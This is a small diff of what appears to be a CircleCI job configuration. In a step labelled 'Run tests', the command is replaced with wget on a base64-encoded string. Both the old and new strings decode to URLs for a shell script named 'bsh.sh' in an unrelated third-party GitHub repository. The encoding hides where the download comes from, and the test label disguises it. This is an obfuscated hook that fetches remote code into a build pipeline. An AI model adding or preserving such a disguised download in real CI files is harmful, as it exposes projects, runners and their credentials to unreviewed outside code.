@@ -7,4 +7,4 @@ jobs:
       - checkout 
       - run: 
           name: Run tests 
-          command: wget aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21yd2hqby9jY2kvbWFpbi9ic2guc2g=
+          command: wget aHR0cHM6Ly9naXRodWIuY29tL21yd2hqby9jY2kvYmxvYi9tYWluL2JzaC5zaA==
